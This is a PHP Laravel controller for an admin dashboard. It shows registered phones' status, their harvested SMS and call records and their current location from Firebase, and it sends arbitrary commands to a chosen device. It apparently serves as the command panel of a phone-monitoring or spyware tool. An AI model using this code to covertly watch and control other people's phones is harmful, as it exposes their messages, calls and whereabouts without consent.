<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use App\Services\FirebaseService;
use App\Services\AnalyticsService;
use App\Models\Device;
use Carbon\Carbon;

/**
 * Dashboard Controller
 * Handles the main admin dashboard functionality
 */
class DashboardController extends Controller
{
    protected $firebaseService;
    protected $analyticsService;

    public function __construct(FirebaseService $firebaseService, AnalyticsService $analyticsService)
    {
        $this->firebaseService = $firebaseService;
        $this->analyticsService = $analyticsService;
    }

    /**
     * Display the main dashboard
     */
    public function index()
    {
        try {
            // Get device statistics
            $deviceStats = $this->getDeviceStatistics();
            
            // Get recent activities
            $recentActivities = $this->getRecentActivities();
            
            // Get live devices
            $liveDevices = $this->getLiveDevices();
            
            return view('dashboard.index', compact(
                'deviceStats',
                'recentActivities', 
                'liveDevices'
            ));
            
        } catch (\Exception $e) {
            return back()->with('error', 'Failed to load dashboard: ' . $e->getMessage());
        }
    }

    /**
     * Get device statistics
     */
    private function getDeviceStatistics()
    {
        $devices = Device::all();
        $onlineDevices = Device::where('status', 'online')->count();
        $offlineDevices = Device::where('status', 'offline')->count();
        
        return [
            'total' => $devices->count(),
            'online' => $onlineDevices,
            'offline' => $offlineDevices,
            'last_24h' => Device::where('created_at', '>=', Carbon::now()->subDay())->count()
        ];
    }

    /**
     * Get recent activities from Firebase
     */
    private function getRecentActivities()
    {
        try {
            $activities = [];
            
            // Get recent SMS
            $recentSms = $this->firebaseService->getRecentData('sms', 10);
            foreach ($recentSms as $sms) {
                $activities[] = [
                    'type' => 'sms',
                    'title' => 'SMS ' . ($sms['type'] ?? 'received'),
                    'description' => 'From: ' . ($sms['phone_number'] ?? 'Unknown'),
                    'timestamp' => $sms['timestamp'] ?? time(),
                    'device_id' => $sms['deviceId'] ?? 'Unknown'
                ];
            }
            
            // Get recent calls
            $recentCalls = $this->firebaseService->getRecentData('calls', 10);
            foreach ($recentCalls as $call) {
                $activities[] = [
                    'type' => 'call',
                    'title' => 'Call ' . ($call['type'] ?? 'received'),
                    'description' => 'From: ' . ($call['phone_number'] ?? 'Unknown'),
                    'timestamp' => $call['timestamp'] ?? time(),
                    'device_id' => $call['deviceId'] ?? 'Unknown'
                ];
            }
            
            // Sort by timestamp
            usort($activities, function($a, $b) {
                return $b['timestamp'] - $a['timestamp'];
            });
            
            return array_slice($activities, 0, 20);
            
        } catch (\Exception $e) {
            \Log::error('Failed to get recent activities: ' . $e->getMessage());
            return [];
        }
    }

    /**
     * Get live devices from Firebase
     */
    private function getLiveDevices()
    {
        try {
            $devices = $this->firebaseService->getAllDevices();
            $liveDevices = [];
            
            foreach ($devices as $deviceId => $device) {
                $lastSeen = $device['lastSeen'] ?? 0;
                $isOnline = (time() - ($lastSeen / 1000)) < 300; // 5 minutes
                
                $liveDevices[] = [
                    'device_id' => $deviceId,
                    'status' => $isOnline ? 'online' : 'offline',
                    'last_seen' => $lastSeen,
                    'app_version' => $device['appVersion'] ?? 'Unknown',
                    'fcm_token' => isset($device['fcmToken'])
                ];
            }
            
            return $liveDevices;
            
        } catch (\Exception $e) {
            \Log::error('Failed to get live devices: ' . $e->getMessage());
            return [];
        }
    }

    /**
     * Get device details via AJAX
     */
    public function getDeviceDetails($deviceId)
    {
        try {
            $device = $this->firebaseService->getDevice($deviceId);
            
            if (!$device) {
                return response()->json(['error' => 'Device not found'], 404);
            }
            
            // Get recent location
            $location = $this->firebaseService->getCurrentLocation($deviceId);
            
            // Get recent activities for this device
            $activities = $this->getDeviceActivities($deviceId);
            
            return response()->json([
                'device' => $device,
                'location' => $location,
                'activities' => $activities
            ]);
            
        } catch (\Exception $e) {
            return response()->json(['error' => $e->getMessage()], 500);
        }
    }

    /**
     * Get activities for specific device
     */
    private function getDeviceActivities($deviceId, $limit = 10)
    {
        $activities = [];
        
        // Get SMS for device
        $sms = $this->firebaseService->getDeviceData('sms', $deviceId, $limit);
        foreach ($sms as $item) {
            $activities[] = [
                'type' => 'sms',
                'data' => $item,
                'timestamp' => $item['timestamp'] ?? time()
            ];
        }
        
        // Get calls for device
        $calls = $this->firebaseService->getDeviceData('calls', $deviceId, $limit);
        foreach ($calls as $item) {
            $activities[] = [
                'type' => 'call',
                'data' => $item,
                'timestamp' => $item['timestamp'] ?? time()
            ];
        }
        
        // Sort by timestamp
        usort($activities, function($a, $b) {
            return $b['timestamp'] - $a['timestamp'];
        });
        
        return array_slice($activities, 0, $limit);
    }

    /**
     * Send command to device
     */
    public function sendCommand(Request $request)
    {
        $request->validate([
            'device_id' => 'required|string',
            'command' => 'required|string',
            'parameters' => 'nullable|array'
        ]);
        
        try {
            $result = $this->firebaseService->sendCommand(
                $request->device_id,
                $request->command,
                $request->parameters ?? []
            );
            
            return response()->json([
                'success' => true,
                'message' => 'Command sent successfully',
                'result' => $result
            ]);
            
        } catch (\Exception $e) {
            return response()->json([
                'success' => false,
                'message' => 'Failed to send command: ' . $e->getMessage()
            ], 500);
        }
    }
}